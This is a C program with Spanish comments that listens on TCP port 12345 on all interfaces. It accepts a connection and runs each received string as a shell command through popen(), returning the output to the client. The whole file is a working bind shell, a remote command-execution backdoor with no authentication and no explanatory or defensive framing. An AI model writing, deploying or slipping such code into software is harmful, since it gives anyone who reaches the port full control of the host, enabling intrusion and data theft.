#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 12345

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[1024];

    // Crear socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == -1) {
        perror("Error al crear el socket");
        exit(EXIT_FAILURE);
    }

    // Configurar la dirección del servidor
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Enlazar el socket al puerto
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        perror("Error al enlazar el socket");
        exit(EXIT_FAILURE);
    }

    // Escuchar conexiones entrantes
    if (listen(server_socket, 5) == -1) {
        perror("Error al escuchar conexiones");
        exit(EXIT_FAILURE);
    }

    printf("El servidor está escuchando en el puerto %d...\n", PORT);

    // Aceptar la conexión entrante
    client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
    if (client_socket == -1) {
        perror("Error al aceptar la conexión");
        exit(EXIT_FAILURE);
    }

    printf("Conexión establecida desde %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

    // Recibir y ejecutar comandos
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        ssize_t bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);

        if (bytes_received <= 0) {
            break; // Si no hay datos, salir del bucle
        }

        // Ejecutar el comando y enviar la salida al cliente
        FILE* cmd_output = popen(buffer, "r");
        if (cmd_output == NULL) {
            perror("Error al ejecutar el comando");
            exit(EXIT_FAILURE);
        }

        while (fgets(buffer, sizeof(buffer), cmd_output) != NULL) {
            send(client_socket, buffer, strlen(buffer), 0);
        }

        pclose(cmd_output);
    }

    // Cerrar conexiones
    close(client_socket);
    close(server_socket);

    return 0;
}
